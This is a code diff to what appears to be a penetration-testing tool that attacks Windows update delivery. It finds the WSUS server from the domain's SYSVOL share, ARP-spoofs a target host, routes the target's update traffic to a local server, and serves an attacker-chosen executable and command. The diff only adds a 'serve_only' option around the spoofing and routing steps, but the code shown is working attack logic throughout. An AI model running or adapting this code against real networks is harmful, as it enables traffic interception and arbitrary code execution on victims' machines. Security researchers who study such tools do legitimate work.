@@ -35,7 +35,7 @@ class Wsuks:
         self.local_password = "".join(random.sample(ascii_letters + digits, 12)) + "1!"
 
         # Set args
-        self.targetIp = args.targetIp  # Never None (required)
+        self.targetIp = args.targetIp
         self.executable_file = args.executable.read()
         self.executable_name = os.path.basename(args.executable.name)
         args.executable.close()
@@ -93,33 +93,34 @@ class Wsuks:
         self.logger.success(f"Command to execute: \n{highlight(self.executable_name, 'yellow')} {highlight(self.command, 'yellow')}")
 
     def run(self):
-        # Get the WSUS server IP and Port from the sysvol share
-        sysvolparser = SysvolParser()
-        if not self.wsusIp:
-            self.logger.info("WSUS Server not specified, trying to find it in SYSVOL share on DC")
-            self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.domain_username, self.domain_password, self.dcIp, self.kerberos, self.dcName)
-        else:
-            self.logger.info(f"WSUS Server specified manually: {self.wsusIp}:{self.wsusPort}")
+        if not self.args.serve_only:
+            # Get the WSUS server IP and Port from the sysvol share
+            sysvolparser = SysvolParser()
+            if not self.wsusIp:
+                self.logger.info("WSUS Server not specified, trying to find it in SYSVOL share on DC")
+                self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.domain_username, self.domain_password, self.dcIp, self.kerberos, self.dcName)
+            else:
+                self.logger.info(f"WSUS Server specified manually: {self.wsusIp}:{self.wsusPort}")
 
-        if self.args.only_discover:
-            self.logger.info("Discovered WSUS Server, Exiting...")
-            return
+            if self.args.only_discover:
+                self.logger.info("Discovered WSUS Server, Exiting...")
+                return
 
-        # Should only happen when crawling SYSVOL share
-        if not self.wsusIp or not self.wsusPort:
-            self.logger.error("Error: WSUS-Server-IP not set. Try to specify the WSUS Server manually with --WSUS-Server and --WSUS-Port. Exiting...")
-            sys.exit(1)
-        else:
-            self.wsusPort = int(self.wsusPort)
+            # Should only happen when crawling SYSVOL share
+            if not self.wsusIp or not self.wsusPort:
+                self.logger.error("Error: WSUS-Server-IP not set. Try to specify the WSUS Server manually with --WSUS-Server and --WSUS-Port. Exiting...")
+                sys.exit(1)
+            else:
+                self.wsusPort = int(self.wsusPort)
 
-        self.logger.info("===== Setup done, starting services =====")
-        # Start Arp Spoofing
-        arpspoofer = ArpSpoofer(self.interface)
-        arpspoofer.start(self.targetIp, self.wsusIp)
+            self.logger.info("===== Setup done, starting services =====")
+            # Start Arp Spoofing
+            arpspoofer = ArpSpoofer(self.interface)
+            arpspoofer.start(self.targetIp, self.wsusIp)
 
-        # Set up routing to route spoofed packages to the local HTTP server
-        router = Router(self.targetIp, self.hostIp, self.wsusIp, self.wsusPort, self.interface)
-        router.start()
+            # Set up routing to route spoofed packages to the local HTTP server
+            router = Router(self.targetIp, self.hostIp, self.wsusIp, self.wsusPort, self.interface)
+            router.start()
 
         # Prepare WSUS HTTP Server
         # If we have a TLS cert we have to switch to HTTPS and supply the DNS name
